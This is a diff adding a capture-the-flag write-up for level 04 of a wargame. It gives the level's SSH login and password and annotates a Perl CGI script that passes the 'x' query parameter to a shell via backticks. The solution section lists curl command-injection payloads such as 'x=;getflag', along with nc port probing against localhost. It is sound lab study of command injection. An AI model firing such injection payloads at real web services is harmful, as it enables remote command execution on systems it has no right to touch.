@@ -1,0 +1,56 @@
+# 04 
+
+Login
+
+```b
+> ssh level04@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
+> Password: qi0maab88jeaj46qoumi7maus
+```
+
+We have a PERL script, \
+and it seems to interact with a webpage:
+
+```pl
+#!/usr/bin/perl
+# localhost:4747
+
+use CGI qw{param};
+  # CGI (Common Gateway Interface)
+  # param: a CGI module func fetches params from HTTP requests
+  # qw: quote words
+
+print "Content-type: text/html\n\n";
+
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+  # sub -- define subroutine x
+  # $_[0] -- subroutine `x()` takes a single arg`
+  # print w/ backticks invokes a shell command
+  # 2>&1 -- combine stdout and stderr, & means 1 is a fd not a filename
+}
+
+x(param("x"));
+  # 1st `x` : calling the subroutine
+  # 2nd `x` : a query param
+  # x comes in form of "...?x=getflag"
+```
+
+Solution
+- try to scan and connect to `localhost:4242`
+- set the query payload and Perl will echo it 
+
+```b
+> curl -I localhost:4747
+or
+> nc -vz localhost 4747
+      ^ v: verbose
+        z: scan if a port is open (a listening daemon)
+Connection to localhost 4747 port [tcp/*] succeeded!
+
+# solve
+
+curl localhost:4747?x="\`$(which getflag)\`"
+curl localhost:4747?x="\`$(whereis getflag | awk '{print $2}')\`"
+curl --get --data-urlencode 'x=;getflag' localhost:4747
+```
